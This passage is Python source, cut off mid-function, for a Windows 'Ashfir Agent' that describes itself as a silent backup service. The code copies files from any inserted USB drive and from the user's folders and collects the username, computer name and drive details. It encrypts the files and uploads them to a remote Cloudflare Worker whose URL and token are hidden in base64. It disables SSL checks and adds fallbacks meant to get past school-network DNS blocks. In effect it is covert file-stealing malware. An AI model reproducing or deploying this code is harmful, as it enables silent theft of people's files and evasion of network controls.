"""
Ashfir Agent - Sessiz Arkaplan Servisi
Flash suruculer: takılınca dosyalar once locale kopyalanır, sonra yedeklenir.
Dosyalar sunucu uzerinden Firebase'e yuklenir (agent'ta Firebase credentials gerekmez).
"""

import os
import sys
import json
import time
import base64
import shutil
import logging
import hashlib
import threading
import string
import subprocess
import tempfile
import requests
import certifi
import ssl
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
import urllib3
import socket
import zipfile
import psutil
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import winreg
from pathlib import Path
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes

def check_anti_debug():
    # Bu fonksiyon güvenlik amacı ile kaldırılmıştır.
    # İşlev: Uygulamanın bir debugger (hata ayıklayıcı) altında çalışıp çalışmadığını kontrol eder.
    pass


check_anti_debug()

_ashfir_mutex = None
def check_single_instance():
    global _ashfir_mutex
    try:
        # Sistem genelinde benzersiz bir Mutex oluştur
        _ashfir_mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\Ashfir_Single_Instance_Mutex_2026")
        if ctypes.windll.kernel32.GetLastError() == 183: # ERROR_ALREADY_EXISTS
            os._exit(0)
    except:
        pass

check_single_instance()

# ── GUVENLIK NOTU ───────────────────────────────────────────
# SSL sertifika doğrulama bypass ve güvenlik denetimi atlama 
# mekanizmaları, kötüye kullanımı önlemek amacıyla bu sürümden kaldırılmıştır.
# Orijinal sürümde kurumsal ağlardaki sertifika sorunlarını aşmak için.
# ── DIZINLER VE API YAPILANDIRMASI ───────────────────────────
CF_URL   = base64.b64decode("aHR0cHM6Ly9jbG91ZGZsYXJlLXdvcmtlcndvcmtlcmpzLnN0b2twcm9yZXNtaS53b3JrZXJzLmRldg==").decode()
CF_TOKEN = base64.b64decode("YXNoZmlyX3NlY3JldF90b2tlbl9LOHg5UDF6VzRtN045cTJSNXQ4VjF5NFo3YzBmM2k2bDlvMg==").decode()
FIREBASE_URL = "https://us-central1-sigalmedia.cloudfunctions.net/api"

# Disable insecure request warning for MEB network SSL bypass
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sh = requests.Session()
sh.verify = False


def cf_post(endpoint, json_data=None, files=None, data=None):
    url = f"{CF_URL}{endpoint}"
    current_minute = int(time.time() / 60)
    token_string = f"{CF_TOKEN}_{current_minute}"
    dynamic_token = hashlib.sha256(token_string.encode()).hexdigest()
    
    headers = {"Authorization": f"Bearer {dynamic_token}"}
    timeout = 60 if 'upload' in endpoint else 30
    
    for attempt in range(3):
        # 1. Önce Cloudflare proxy'sini dene
        try:
            if files:
                res = sh.post(url, headers=headers, files=files, data=data, timeout=timeout)
            else:
                res = sh.post(url, headers=headers, json=json_data, timeout=timeout)
            
            if res.status_code == 429:
                wait = int(res.headers.get('Retry-After', 5 * (attempt + 1)))
                log.warning(f"⏳ Rate limit ({endpoint}), {wait}s bekleniyor... (Deneme {attempt+1}/3)")
                time.sleep(wait)
                current_minute = int(time.time() / 60)
                token_string = f"{CF_TOKEN}_{current_minute}"
                dynamic_token = hashlib.sha256(token_string.encode()).hexdigest()
                headers["Authorization"] = f"Bearer {dynamic_token}"
                continue
            
            if res.status_code != 200:
                log.warning(f"CF Response ({endpoint}): HTTP {res.status_code} - {res.text[:200]}")
            return res
        except Exception as e_primary:
            log.warning(f"⚠️ Primary URL failed ({endpoint}): {type(e_primary).__name__}. Fallback Firebase deneniyor...")
            
            # 2. Hata durumunda (örn: MEB DNS engeli) doğrudan Firebase backend'e istek at (verify=False ile SSL atla)
            fallback_url = f"{FIREBASE_URL}{endpoint}"
            try:
                if files:
                    res = sh.post(fallback_url, headers=headers, files=files, data=data, timeout=timeout, verify=False)
                else:
                    res = sh.post(fallback_url, headers=headers, json=json_data, timeout=timeout, verify=False)
                
                if res.status_code == 429:
                    wait = int(res.headers.get('Retry-After', 5 * (attempt + 1)))
                    log.warning(f"⏳ Fallback Rate limit ({endpoint}), {wait}s bekleniyor... (Deneme {attempt+1}/3)")
                    time.sleep(wait)
                    current_minute = int(time.time() / 60)
                    token_string = f"{CF_TOKEN}_{current_minute}"
                    dynamic_token = hashlib.sha256(token_string.encode()).hexdigest()
                    headers["Authorization"] = f"Bearer {dynamic_token}"
                    continue
                
                if res.status_code != 200:
                    log.warning(f"Fallback Response ({endpoint}): HTTP {res.status_code} - {res.text[:200]}")
                return res
            except Exception as e_fallback:
                log.error(f"❌ Fallback Request Error ({endpoint}): {type(e_fallback).__name__}: {e_fallback}")
                if attempt < 2:
                    time.sleep(3)
                else:
                    return None
    return None

RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoAxbUMZOhXV0VVXikqlS
BcYRVomfzBzNY59WeuBvV46Ak/gk9Ythk57USHuzdjuRxrlD1QQGHF+vViQVHBV2
Y+4SnQplU1NFqHcqlAUkrJtU9vr0yCxmF8eg5oh/BdCwk169cGd/qCvjVz6vjOsW
iQf8Ic8355SJJtEyd8t/nagTr6NUs7PoPTiPwR/2D1Ln4pm9oHOwJdxn1McweuDm
3TFGejqrBT5tL0i9gCbF3O3+B+Jpo9osXEsXISTkfQL3F5y03ChEusSkrlJDKPiN
82TAv7dirNkD5sksXtsnHAE31NBPwZvfe9uXEQgEbb/MKJXmM/S26LWH9v1l2F7p
hQIDAQAB
-----END PUBLIC KEY-----"""

BASE_DIR  = Path(os.environ.get('LOCALAPPDATA', Path.home())) / 'Ashfir'
LOG_FILE  = BASE_DIR / 'ashfir.log'
CFG_FILE  = BASE_DIR / 'config.json'
STAGE_DIR = BASE_DIR / 'flash_stage'
BASE_DIR.mkdir(parents=True, exist_ok=True)
STAGE_DIR.mkdir(parents=True, exist_ok=True)


# ── LOGGING ──────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8')],
)
log = logging.getLogger('Agent')


# ── FILTRE TANIMLARI ─────────────────────────────────────────
BLOCKED_DIRS = {
    'node_modules', '.git', '__pycache__', 'dist', 'build', 'venv',
    '.vs', '.idea', 'obj', 'bin', 'debug', 'release'
}
CODE_EXTENSIONS = {
    '.js', '.ts', '.py', '.cpp', '.c', '.h', '.cs', '.java', '.go', '.rs',
    '.php', '.html', '.css', '.scss', '.less', '.jsx', '.tsx', '.vue',
    '.json', '.yml', '.yaml', '.xml', '.sql', '.sh', '.bat', '.ps1'
}


def file_hash(path):
    try:
        # Check if file is accessible
        if not os.path.exists(path): return None
        h = hashlib.md5()
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                h.update(chunk)
        return h.hexdigest()
    except Exception as e:
        log.debug(f"Dosya hash hatası ({path}): {e}")
        return None


def human_size(s):
    for u in ['B', 'KB', 'MB', 'GB']:
        if s < 1024:
            return f'{s:.1f}{u}'
        s /= 1024
    return f'{s:.1f}TB'



# ── NETWORK UTILS ────────────────────────────────────────────
def is_online():
    """
    MEB internetinde workers.dev DNS bloklu olabildiğinden hem CF hem de Firebase hedeflerini dener.
    """
    # 1. Önce Cloudflare Worker'a dene
    try:
        res = sh.get(f"{CF_URL}/ping", timeout=5)
        if res.status_code < 500:
            return True
    except Exception:
        pass
    
    # 2. Fallback: Doğrudan Firebase backend'e dene (SSL doğrulama atlanır)
    try:
        res = sh.get(f"{FIREBASE_URL}/ping", timeout=5, verify=False)
        if res.status_code < 500:
            return True
    except Exception:
        pass

    # 3. Fallback: Firebase host IP düzeyinde TCP port 443 bağlantısı (DNS bypass)
    try:
        socket.setdefaulttimeout(5)
        host = FIREBASE_URL.replace("https://", "").split("/")[0]
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, 443))
        return True
    except socket.error:
        pass

    # 4. Fallback: Cloudflare host IP düzeyinde TCP port 443 bağlantısı
    try:
        socket.setdefaulttimeout(5)
        host = CF_URL.replace("https://", "").split("/")[0]
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, 443))
        return True
    except socket.error:
        return False

def get_network_chunk_size():
    """
    MEB'de speed test siteleri bloklu olabilir.
    Sabit 4MB kullan — zaten yeterli ve güvenli.
    """
    return 4 * 1024 * 1024  # 4MB sabit


# ── ENCRYPTION UTILS ─────────────────────────────────────────
def encrypt_zip_file(zip_path):
    aes_key = get_random_bytes(32)
    # Use 12 byte nonce (96-bit) as it's the standard for GCM and SubtleCrypto
    nonce = get_random_bytes(12)
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    
    with open(zip_path, 'rb') as f:
        data = f.read()
    
    ciphertext, tag = cipher.encrypt_and_digest(data)
    enc_path = str(zip_path) + ".enc"
    
    # Pack as: NONCE (12) + CIPHERTEXT + TAG (16)
    with open(enc_path, 'wb') as f:
        f.write(nonce)
        f.write(ciphertext)
        f.write(tag)
        
    rsa_key = RSA.import_key(RSA_PUBLIC_KEY)
    rsa_cipher = PKCS1_OAEP.new(rsa_key)
    encrypted_aes_key = rsa_cipher.encrypt(aes_key)
    
    return enc_path, base64.b64encode(encrypted_aes_key).decode('utf-8')


# ── AGENT CONFIG ─────────────────────────────────────────────
class AgentConfig:
    def __init__(self):
        self._lock   = threading.Lock()
        self._local  = self._load_local()
        self._remote = {}

    def _load_local(self):
        try:
            with open(CFG_FILE) as f:
                return json.load(f)
        except Exception as e:
            log.error(f'config.json okunamadı: {e}')
            sys.exit(1)

    @property
    def key(self):          return self._local.get('key', '')
    @property
    def machine_name(self): return self._local.get('machine_name', 'PC')

    def get(self, k, default=None):
        with self._lock:
            return self._remote.get(k, self._local.get(k, default))

    def update_remote(self, cfg):
        with self._lock:
            self._remote = cfg

    @property
    def all_remote(self):
        with self._lock:
            return dict(self._remote)

    def has_watch_paths_changed(self, new_cfg):
        old_paths = self._remote.get('watch_paths', [])
        new_paths = new_cfg.get('watch_paths', [])
        return sorted(old_paths) != sorted(new_paths)


# ── SUNUCU LOG HANDLER ───────────────────────────────────────
class ServerLogHandler(logging.Handler):
    def __init__(self, cfg):
        super().__init__()
        self.cfg = cfg
        self._queue = []
        self._lock = threading.Lock()
        self._flush_interval = 5  # 5 saniyede bir toplu gönder
        self._max_batch = 50     # Tek seferde max 50 log
        self._start_flusher()

    def _start_flusher(self):
        def flusher():
            while True:
                time.sleep(self._flush_interval)
                self._flush()
        t = threading.Thread(target=flusher, daemon=True)
        t.start()

    def emit(self, record):
        try:
            msg = self.format(record)
            # Sonsuz döngü koruması: kendi log isteklerimizi tekrar loglama
            if "CF Request" in msg or "cf_post" in msg or "/log" in msg:
                return
            level = record.levelname.lower()
            if 'yüklendi' in msg or '☁️' in msg: level = 'success'
            elif 'zipleniyor' in msg or 'zip' in msg.lower(): level = 'info'
            elif 'atlandı' in msg or 'skip' in msg.lower(): level = 'skip'
            elif 'ai' in msg.lower() or '[ai' in msg.lower(): level = 'ai'
            elif 'hata' in msg.lower() or 'error' in msg.lower(): level = 'error'
            elif 'uyarı' in msg.lower() or 'warning' in msg.lower(): level = 'warning'
            with self._lock:
                self._queue.append({
                    'text':  msg,
                    'level': level,
                    'ts':    int(record.created * 1000),
                })
        except: pass

    def _flush(self):
        with self._lock:
            if not self._queue: return
            batch = self._queue[:self._max_batch]
            self._queue = self._queue[self._max_batch:]

        # Toplu gönder (tek HTTP isteği ile)
        try:
            cf_post('/log_batch', json_data={
                "key": self.cfg.key,
                "logs": batch,
                "source": "agent"
            })
        except:
            # Başarısız olursa eski tek tek yöntemi dene
            for log_data in batch:
                try:
                    cf_post('/log', json_data={
                        "key": self.cfg.key,
                        "level": log_data["level"],
                        "message": log_data["text"],
                        "source": "agent",
                        "ts": log_data["ts"]
                    })
                except:
                    # Gönderilemeyenleri tekrar kuyruğa al
                    with self._lock:
                        self._queue.insert(0, log_data)
                    break


# ── QUEUE MANAGER & UPLOADER ─────────────────────────────────
class QueueManager:
    def __init__(self):
        self.queue_file = BASE_DIR / 'upload_queue.json'
        self.lock = threading.Lock()
        self.queue = self._load()

    def _load(self):
        try:
            if self.queue_file.exists():
                with open(self.queue_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return {}

    def _save(self):
        try:
            with open(self.queue_file, 'w', encoding='utf-8') as f:
                json.dump(self.queue, f)
        except:
            pass

    def enqueue(self, local_path, watch_root, ai_reason='', ai_confidence=1.0, source_label=''):
        with self.lock:
            p = str(Path(local_path))
            self.queue[p] = {
                'watch_root': str(watch_root),
                'ai_reason': ai_reason,
                'ai_confidence': ai_confidence,
                'source_label': source_label,
                'added_at': time.time()
            }
            self._save()

    def get_all(self):
        with self.lock:
            return dict(self.queue)

    def remove(self, paths):
        with self.lock:
            for p in paths:
                self.queue.pop(p, None)
            self._save()

class Uploader:
    def __init__(self, cfg):
        self.cfg = cfg
        self._lock = threading.Lock()
        self.cache_file = BASE_DIR / 'upload_cache.json'
        self.cache = self._load_cache()

    def _load_cache(self):
        try:
            if self.cache_file.exists():
                with open(self.cache_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except: pass
        return {}

    def _save_cache(self):
        try:
            with open(self.cache_file, 'w', encoding='utf-8') as f:
                json.dump(self.cache, f)
        except: pass

    def is_cached(self, path):
        fhash = file_hash(path)
        if not fhash:
            return False, None
        return self.cache.get(path) == fhash, fhash

    def update_cache(self, path, fhash):
        self.cache[path] = fhash
        self._save_cache()

    def upload_zip(self, zip_path, encrypted_aes_key, original_files, total_size):
        try:
            now_iso = datetime.now().isoformat()
            zip_name = Path(zip_path).name
            remote_name = f'backups/{self.cfg.key}/{self.cfg.machine_name}/Zips/{zip_name}'.replace('\\', '/')
            
            log.info(f'☁️ Zip Yükleniyor: {zip_name} ({human_size(total_size)})')
            
            meta = {
                "key": self.cfg.key,
                "path": remote_name,
                "name": zip_name,
                "size": total_size,
                "in_zip": True,
                "encrypted_aes_key": encrypted_aes_key,
                "zip_name": zip_name,
                "machine": self.cfg.machine_name,
                "original_path": original_files[0]['path'] if original_files else '',
                "backup_time": now_iso,
                "ext": ".zip",
                "original_files": original_files 
            }
            
            # 1. Firebase Functions'tan Signed URL al (Cloudflare proxy üzerinden)
            res_url = cf_post('/get_upload_url', json_data={"metadata": meta})
            if not res_url or res_url.status_code != 200:
                log.error(f'❌ Signed URL alınamadı: {res_url.text if res_url else "No response"}')
                return False
                
            upload_url = res_url.json().get('uploadUrl')
            if not upload_url:
                log.error('❌ Upload URL dönmedi')
                return False

            # 2. Doğrudan Signed URL'e Cloudflare Worker üzerinden PUT isteği ile dosyayı yükle (Stream)
            current_minute = int(time.time() / 60)
            token_string = f"{CF_TOKEN}_{current_minute}"
            dynamic_token = hashlib.sha256(token_string.encode()).hexdigest()
            
            headers = {
                "Authorization": f"Bearer {dynamic_token}",
                "X-Proxy-Target": upload_url,
                "Content-Type": "application/octet-stream"
            }
            
            res_upload = None
            try:
                # Önce Cloudflare proxy'si üzerinden dene
                with open(zip_path, 'rb') as f:
                    res_upload = sh.put(f"{CF_URL}/proxy_upload", headers=headers, data=f, timeout=300)
            except Exception as e_primary:
                log.warning(f"⚠️ Primary upload failed ({type(e_primary).__name__}). Fallback direct upload deneniyor...")
                # DNS veya Bağlantı hatası durumunda GCS Signed URL'ine DOĞRUDAN bağlan (verify=False ile SSL atla)
                try:
                    with open(zip_path, 'rb') as f:
                        # Direct upload to Signed URL. Headers should not contain dynamic authorization or proxy headers.
                        res_upload = sh.put(upload_url, data=f, verify=False, timeout=300)
                except Exception as e_fallback:
                    log.error(f"❌ Fallback upload failed ({type(e_fallback).__name__}: {e_fallback})")
            
            if res_upload and res_upload.status_code == 200:
                log.info(f'✅ Zip Yüklendi: {zip_name}')
                return True
            else:
                resp_text = res_upload.text if res_upload else "No response"
                log.error(f'❌ Zip yükleme hatası: {resp_text}')
                return False
        except Exception as e:
            log.error(f'❌ Zip yükleme hatası: {e}')
            return False

# ── AI FILTRE ────────────────────────────────────────────────
try:
    sys.path.insert(0, str(BASE_DIR))
    from ai_filter import AIFilter as _AIFilter
    _AI_AVAILABLE = True
except ImportError:
    _AI_AVAILABLE = False


class SmartFilter:
    def __init__(self, cfg):
        self.cfg    = cfg
        self._ai    = None
        self._cache = {}

    def _get_ai(self):
        if not _AI_AVAILABLE:
            return None
        key = self.cfg.get('groq_api_key', '')
        if not key or not self.cfg.get('ai_filter_enabled', True):
            return None
        if self._ai is None:
            try:
                self._ai = _AIFilter(api_key=key)
            except:
                pass
        return self._ai

    def should_backup(self, path, size):
        ai = self._get_ai()
        if not ai:
            return {'should_backup': True, 'reason': '', 'confidence': 1.0}
        if path in self._cache:
            return self._cache[path]
        result = ai.should_backup(path, size)
        self._cache[path] = result
        return result


# ── DOSYA FILTRE ─────────────────────────────────────────────
def passes_basic(path, cfg):
    p = Path(path)

    parts = set(p.parts)
    if any(d.lower() in BLOCKED_DIRS for d in parts):
        return False

    if p.name.startswith('.') or p.name in {'Thumbs.db', 'desktop.ini', '.DS_Store'}:
        return False

    skip_ext = {'.tmp', '.temp', '.swp', '.lock'}
    if p.suffix.lower() in skip_ext or p.name.endswith('~'):
        return False

    max_mb = cfg.get('max_file_size_mb', 100)
    try:
        if p.stat().st_size > max_mb * 1024 * 1024:
            return False
    except:
        return False

    ext     = p.suffix.lower()
    allowed = [e.lower() for e in cfg.get('allowed_extensions', ['.word', '.docx', '.pdf', '.xlsx'])]
    blocked = [e.lower() for e in cfg.get('blocked_extensions', [])]

    if ext in CODE_EXTENSIONS and ext not in allowed:
        log.debug(f'Kod dosyası atlandı: {p.name}')
        return False

    if allowed and ext not in allowed:
        return False

    if blocked and ext in blocked:
        return False

    return True


# ── WATCHDOG HANDLER ─────────────────────────────────────────
class Handler(FileSystemEventHandler):
    def __init__(self, queue_manager, ai_filter, cfg, watch_root, stats, source_label=''):
        super().__init__()
        self.queue_manager = queue_manager
        self.ai           = ai_filter
        self.cfg          = cfg
        self.watch_root   = watch_root
        self.stats        = stats
        self.source_label = source_label
        self._timers      = {}
        self._lock        = threading.Lock()

    def _schedule(self, path):
        with self._lock:
            if path in self._timers:
                self._timers[path].cancel()
            t = threading.Timer(
                self.cfg.get('debounce_seconds', 2.0),
                self._process, args=[path]
            )
            self._timers[path] = t
            t.start()

    def _process(self, path):
        with self._lock:
            self._timers.pop(path, None)
        if not os.path.isfile(path):
            return
        rc = self.cfg.all_remote
        if not passes_basic(path, rc):
            return
        size  = os.path.getsize(path)
        ai_r  = self.ai.should_backup(path, size)
        if not ai_r['should_backup']:
            self.stats['ai_skipped'] += 1
            return
        if self.queue_manager:
            self.queue_manager.enqueue(
                path, self.watch_root,
                ai_r.get('reason', ''), ai_r.get('confidence', 1.0),
                self.source_label
            )
            self.stats['files_uploaded'] += 1 # Technically queued
            self.stats['last_file'] = Path(path).name

    def on_created(self, e):
        if not e.is_directory:
            self._schedule(e.src_path)

    def on_modified(self, e):
        if not e.is_directory:
            self._schedule(e.src_path)


# ── USB / FLASH SURUCU IZLEYICI ──────────────────────────────
import ctypes

DRIVE_REMOVABLE = 2


def get_removable_drives():
    drives = []
    try:
        for part in psutil.disk_partitions(all=False):
            if 'removable' in part.opts or 'cdrom' not in part.opts:
                # Windows-specific fallback for USBs
                if part.fstype in ['FAT32', 'exFAT', 'NTFS'] and 'removable' in part.opts:
                    drives.append(part.device)
        
        # Fallback to ctypes if psutil is empty
        if not drives:
            import ctypes, string
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for i, letter in enumerate(string.ascii_uppercase):
                if bitmask & (1 << i):
                    path = f'{letter}:\\\\'
                    if ctypes.windll.kernel32.GetDriveTypeW(path) == 2: # DRIVE_REMOVABLE
                        if path not in drives: drives.append(path)
    except Exception as e:
        log.debug(f'Drive listesi alınamadı: {e}')
    return drives


def copy_flash_to_stage(drive_path: str, max_mb: float, cfg: dict) -> list:
    drive_letter = drive_path[0].upper()
    dest_dir = STAGE_DIR / f'FLASH_{drive_letter}'
    dest_dir.mkdir(parents=True, exist_ok=True)
    
    copied_files = []
    
    try:
        for root, dirs, files in os.walk(drive_path):
            # Skip hidden/system directories
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            if any(blk in root.lower() for blk in ['system volume information', '$recycle.bin']):
                continue
                
            for file in files:
                src_path = os.path.join(root, file)
                
                # Check file criteria (size and extension)
                if not passes_basic(src_path, cfg):
                    continue
                    
                try:
                    rel_path = os.path.relpath(src_path, drive_path)
                    dst_path = dest_dir / rel_path
                    dst_path.parent.mkdir(parents=True, exist_ok=True)
                    
                    if not dst_path.exists() or os.path.getmtime(src_path) > os.path.getmtime(dst_path):
                        import shutil
                        shutil.copy2(src_path, dst_path)
                        copied_files.append(str(dst_path))
                except Exception as e:
                    log.debug(f"Flash dosya kopyalama hatası ({src_path}): {e}")
                    
    except Exception as e:
        log.error(f"Flash sürücü taranamadı ({drive_path}): {e}")
        
    return copied_files



class FlashMonitor:
    def __init__(self, queue_manager, ai, cfg, stats, observer):
        self.queue_manager = queue_manager
        self.ai       = ai
        self.cfg      = cfg
        self.stats    = stats
        self.observer = observer
        self._seen    = set(get_removable_drives())
        self._watched = set()
        self._lock    = threading.Lock()
        self.is_copying = False

        if self._seen:
            log.info(f'Başlangıçta takılı flash: {self._seen}')
            for drive in self._seen:
                self._handle_new_drive(drive)

    def _handle_new_drive(self, drive_path):
        rc     = self.cfg.all_remote
        max_mb = rc.get('flash_max_mb', 10)
        log.info(f'Yeni flash takıldı: {drive_path}')

        def copy_and_watch():
            log.info(f'USB kopyalama başladı: {drive_path}')
            copied = copy_flash_to_stage(drive_path, max_mb, rc)
            
            if not copied:
                return

            drive_letter = drive_path[0]
            stage_subdir = str(STAGE_DIR / f'FLASH_{drive_letter}')

            with self._lock:
                if stage_subdir not in self._watched:
                    handler = Handler(
                        self.queue_manager, self.ai, self.cfg,
                        stage_subdir, self.stats,
                        source_label=f'FLASH_{drive_letter}'
                    )
                    self.observer.schedule(handler, stage_subdir, recursive=True)
                    self._watched.add(stage_subdir)

            for fpath in copied:
                if not os.path.isfile(fpath):
                    continue
                size = os.path.getsize(fpath)
                ai_r = self.ai.should_backup(fpath, size)
                if ai_r['should_backup']:
                    self.queue_manager.enqueue(
                        fpath, stage_subdir,
                        ai_r.get('reason', ''), ai_r.get('confidence', 1.0),
                        f'Flash ({drive_path})'
                    )
                    self.stats['files_uploaded'] += 1
                    self.stats['last_file'] = Path(fpath).name
                else:
                    self.stats['ai_skipped'] += 1

            # İşlem bitti, uyuyan background_sync_loop'u hemen uyandır
            sync_wake_event.set()

        threading.Thread(target=copy_and_watch, daemon=True).start()
    def poll(self):
        current  = set(get_removable_drives())
        new_ones = current - self._seen
        for drive in new_ones:
            self._handle_new_drive(drive)
        self._seen = current


# ── AKILLI YOL KEŞFİ ─────────────────────────────────────────
def get_smart_desktop():
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
        ) as key:
            path, _ = winreg.QueryValueEx(key, "Desktop")
            return os.path.expandvars(path)
    except:
        p  = Path.home() / 'Desktop'
        od = Path.home() / 'OneDrive' / 'Desktop'
        return str(od) if od.exists() else str(p)


def get_comprehensive_directory_map():
    dir_map = {
        "user_folders": {},
        "drives": [],
        "recent_files": [],
        "file_categories": {},
        "folder_tree": {},
        "total_stats": {"files": 0, "folders": 0, "total_size": 0}
    }
    
    # Taranacak sistem dışı yollar (kullanıcı dosyaları)
    SKIP_DIRS = {
        'appdata', '.git', 'node_modules', '__pycache__', '.vscode',
        'cache', '.cache', 'temp', 'tmp', '.tmp', 'logs',
        '$recycle.bin', 'system volume information', 'windows',
        'program files', 'program files (x86)', 'programdata',
        'recovery', 'perflogs', 'msocache', 'intel', 'amd',
        'nvidia', '.nuget', '.dotnet', 'anaconda3', 'miniconda3'
    }
    
    IMPORTANT_EXTS = {
        'belgeler': ['.pdf', '.docx', '.doc', '.txt', '.rtf', '.odt', '.pptx', '.ppt', '.xlsx', '.xls', '.csv'],
        'medya': ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.mov', '.avi', '.mkv', '.mp3', '.wav'],
        'arsivler': ['.zip', '.rar', '.7z', '.tar', '.gz'],
        'kod': ['.py', '.js', '.ts', '.java', '.cpp', '.c', '.html', '.css', '.json', '.sql', '.go', '.rs'],
        'veritabani': ['.db', '.sqlite', '.mdb', '.accdb'],
        'tasarim': ['.psd', '.ai', '.fig', '.sketch', '.xd'],
    }
    
    # Tüm ext'lerin flat seti
    all_important_exts = set()
    for exts in IMPORTANT_EXTS.values():
        all_important_exts.update(exts)
    
    try:
        user_profile = os.environ.get('USERPROFILE', '')
        
        # Sürücüleri topla
        try:
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if bitmask & 1:
                    drive_path = f"{letter}:\\"
                    dir_map["drives"].append(drive_path)
                bitmask >>= 1
        except: pass
        
        # Kullanıcı ana klasörlerini derinlemesine tara
        scan_roots = {}
        if user_profile:
            for folder_name in ['Desktop', 'Documents', 'Downloads', 'Pictures', 'Videos', 'Music']:
                fp = os.path.join(user_profile, folder_name)
                if os.path.exists(fp):
                    scan_roots[folder_name] = fp
            
            # OneDrive varsa onu da tara
            onedrive = os.path.join(user_profile, 'OneDrive')
            if os.path.exists(onedrive):
                scan_roots['OneDrive'] = onedrive
        
        # Her klasör için kategorize dosya toplama
        categories = {k: [] for k in IMPORTANT_EXTS}
        all_files_with_time = []
        
        for folder_name, folder_path in scan_roots.items():
            folder_info = {"path": folder_path, "subfolders": [], "file_count": 0, "size": 0, "sample_files": []}
            
            try:
                for root, dirs, files in os.walk(folder_path):
                    # Sistem/gereksiz klasörleri atla
                    dirs[:] = [d for d in dirs if d.lower() not in SKIP_DIRS and not d.startswith('.')]
                    
                    depth = root.replace(folder_path, '').count(os.sep)
                    if depth > 4:  # Max 4 seviye derinliğe git
                        dirs.clear()
                        continue
                    
                    # Alt klasörleri topla (ilk seviye)
                    if depth == 0:
                        folder_info["subfolders"] = [d for d in dirs[:30]]
                    
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        ext = os.path.splitext(fname)[1].lower()
                        
                        if ext not in all_important_exts:
                            continue
                            
                        try:
                            stat = os.stat(fpath)
                            fsize = stat.st_size
                            mtime = stat.st_mtime
                        except:
                            continue
                        
                        folder_info["file_count"] += 1
                        folder_info["size"] += fsize
                        dir_map["total_stats"]["files"] += 1
                        dir_map["total_stats"]["total_size"] += fsize
                        
                        rel_path = os.path.relpath(fpath, user_profile)
                        file_entry = {
                            "name": fname,
                            "path": rel_path,
                            "size": fsize,
                            "size_human": human_size(fsize),
                            "modified": time.strftime('%Y-%m-%d %H:%M', time.localtime(mtime)),
                            "mtime": mtime,
                            "folder": folder_name
                        }
                        
                        # Kategorize et
                        for cat_name, cat_exts in IMPORTANT_EXTS.items():
                            if ext in cat_exts:
                                if len(categories[cat_name]) < 15:
                                    categories[cat_name].append(file_entry)
                                break
                        
                        # Zamanlı listeye ekle (son dosyalar için)
                        all_files_with_time.append(file_entry)
                        
                        # Klasör sample dosyaları (max 10)
                        if len(folder_info["sample_files"]) < 5:
                            folder_info["sample_files"].append({"name": fname, "size": human_size(fsize)})
                            
            except Exception as e:
                log.debug(f"Klasör tarama hatası ({folder_path}): {e}")
            
            dir_map["user_folders"][folder_name] = folder_info
        
        # Son 30 değiştirilen dosya
        all_files_with_time.sort(key=lambda x: x.get("mtime", 0), reverse=True)
        dir_map["recent_files"] = [{k: v for k, v in f.items() if k != 'mtime'} for f in all_files_with_time[:15]]
        
        # Kategorileri ekle
        for cat_name, cat_files in categories.items():
            cat_files.sort(key=lambda x: x.get("mtime", 0), reverse=True)
            dir_map["file_categories"][cat_name] = {
                "count": len(cat_files),
                "files": [{k: v for k, v in f.items() if k != 'mtime'} for f in cat_files[:10]]
            }
        
        dir_map["total_stats"]["total_size_human"] = human_size(dir_map["total_stats"]["total_size"])
        
    except Exception as e:
        log.error(f"Directory map hatasi: {e}")
    
    return dir_map


def get_ai_file_knowledge():
    """AI'a verilecek özetlenmiş bilgi — gereksiz sistem dosyaları yerine kullanıcı dosyalarına odaklanır"""
    knowledge = {
        "drives": [],
        "important_files": [],
        "user_info": {},
        "software_hints": []
    }
    try:
        user_profile = os.environ.get('USERPROFILE', '')
        knowledge["user_info"] = {
            "username": os.environ.get('USERNAME', ''),
            "computer": os.environ.get('COMPUTERNAME', ''),
            "profile_path": user_profile
        }
        
        # Sürücüler
        try:
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if bitmask & 1:
                    drive = f"{letter}:\\"
                    try:
                        usage = psutil.disk_usage(drive)
                        knowledge["drives"].append({
                            "letter": drive,
                            "total": human_size(usage.total),
                            "used": human_size(usage.used),
                            "free": human_size(usage.free)
                        })
                    except:
                        knowledge["drives"].append({"letter": drive})
                bitmask >>= 1
        except: pass
        
        # Önemli dosyaları topla (Documents, Desktop, Downloads)
        important_exts = {'.pdf', '.docx', '.doc', '.xlsx', '.xls', '.pptx', '.txt', '.csv'}
        if user_profile:
            for folder in ['Desktop', 'Documents', 'Downloads']:
                folder_path = os.path.join(user_profile, folder)
                if not os.path.exists(folder_path):
                    continue
                try:
                    for root, dirs, files in os.walk(folder_path):
                        dirs[:] = [d for d in dirs if d.lower() not in {
                            'appdata', '.git', 'node_modules', '__pycache__', 'cache'
                        } and not d.startswith('.')]
                        
                        depth = root.replace(folder_path, '').count(os.sep)
                        if depth > 3:
                            dirs.clear()
                            continue
                            
                        for f in files:
                            ext = os.path.splitext(f)[1].lower()
                            if ext in important_exts:
